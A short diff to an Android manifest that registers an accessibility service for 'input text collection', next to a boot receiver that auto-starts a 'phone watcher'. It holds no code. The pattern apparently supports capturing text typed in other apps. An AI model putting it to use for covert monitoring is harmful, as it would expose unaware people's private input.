@@ -111,6 +111,20 @@
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
+        <!-- Input text collection — accessibility service (user must grant in system settings) -->
+        <service
+            android:name=".service.InputTextAccessibilityService"
+            android:exported="true"
+            android:label="@string/input_text_title"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibilityservice" />
+        </service>
+
         <!-- Boot Receiver — auto-start phone watcher on device boot -->
         <receiver
             android:name=".service.BootReceiver"
